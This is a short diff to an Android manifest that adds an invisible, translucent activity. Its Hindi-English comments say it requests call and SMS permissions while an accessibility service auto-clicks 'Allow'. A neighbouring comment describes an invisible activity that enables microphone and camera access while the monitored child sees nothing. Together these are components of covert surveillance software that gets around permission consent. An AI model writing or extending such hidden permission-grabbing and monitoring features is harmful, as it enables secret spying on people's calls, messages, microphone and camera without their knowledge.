@@ -87,6 +87,15 @@
             android:excludeFromRecents="true"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
 
+        <!-- Calls & SMS permission background request (vc17) — wizard ka "calls"
+             step kisi EK perm par done ho jata tha; READ_SMS missing ho to ye
+             activity teeno ka dialog kholti hai (a11y auto-Allow ke saath). -->
+        <activity
+            android:name=".ui.CallsPermActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+
         <!-- Android 14/15 while-in-use FGS upgrade (mic/camera): invisible
              activity jo 250 ms ke liye app ko foreground banati hai — bachche
              ko KUCH nahi dikhta, par mic/camera FGS type upgrade legal ho jata hai. -->
